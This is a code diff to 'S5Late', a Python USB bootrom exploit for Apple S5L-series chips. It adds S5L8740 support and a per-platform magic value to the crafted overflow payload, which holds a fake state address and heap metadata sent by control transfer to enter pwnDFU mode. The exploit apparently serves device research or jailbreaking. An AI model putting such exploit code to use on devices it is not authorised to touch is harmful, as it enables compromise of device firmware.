@@ -11,7 +11,7 @@ from enum import Enum
 
 import usb
 
-PlatformConfig = namedtuple("PlatformConfig", ["pid", "name", "config", "overwrite_len", "pwn_name", "fake_state"])
+PlatformConfig = namedtuple("PlatformConfig", ["pid", "name", "config", "overwrite_len", "pwn_name", "fake_state", "magic_val"])
 
 PLATFORM_CONFIGS = [
     PlatformConfig(
@@ -20,7 +20,8 @@ PLATFORM_CONFIGS = [
         config="s5l8723",
         overwrite_len=0x24C0,
         pwn_name="S5L8723 pwnDFU",
-        fake_state="n6g_fake_state.bin"
+        fake_state="n6g_fake_state.bin",
+        magic_val=0xC2F3E9B2
     ),
     PlatformConfig(
         pid=0x1233,
@@ -28,7 +29,17 @@ PLATFORM_CONFIGS = [
         config="s5l8443",
         overwrite_len=0x24C0,
         pwn_name="S5L8443 pwnDFU",
-        fake_state="s4g_fake_state.bin"
+        fake_state="s4g_fake_state.bin",
+        magic_val=0xC2F3E9B2
+    ),
+    PlatformConfig(
+        pid=0x1234,
+        name="S5L8740",
+        config="s5l8740",
+        overwrite_len=0x24C0,
+        pwn_name="S5L8740 pwnDFU",
+        fake_state="n7g_fake_state.bin",
+        magic_val=0xBA581067
     )
 ]
 
@@ -198,7 +209,8 @@ class Image1:
         "8900" : 0x800,
         "8442" : 0x800,
         "8723" : 0x400,
-        "8443" : 0x400
+        "8443" : 0x400,
+        "8740" : 0x400
     }
 
     def __init__(self, buffer: bytes):
@@ -403,10 +415,10 @@ def do_pwn(args):
     # this is what goes into the last 16 bytes
     last = struct.pack(
         "<4I",
-        0xC2F3E9B2, # unclear what it is, but incorrect value will break everything
-        0x0,        # state mask, 0 is good enough value
-        0x2202E380, # address of our fake gState
-        0x2202D900  # heap metadata address
+        config.magic_val,   # unclear what it is, but incorrect value will break everything
+        0x0,                # state mask, 0 is good enough value
+        0x2202E380,         # address of our fake gState
+        0x2202D900          # heap metadata address
     )
 
     dev.dev.ctrl_transfer(0x21, 1, 1, 0, last, USB_TIMEOUT)
@@ -605,7 +617,7 @@ def hexint(str) -> int:
     return int(str, 16)
 
 def main():
-    parser = argparse.ArgumentParser(description="S5Late (S5L8723)")
+    parser = argparse.ArgumentParser(description="S5Late (S5L8723/S5L8443/S5L8740)")
     subparsers = parser.add_subparsers()
 
     pwn_parse = subparsers.add_parser("pwn", help="run the exploit to enter pwnDFU mode")
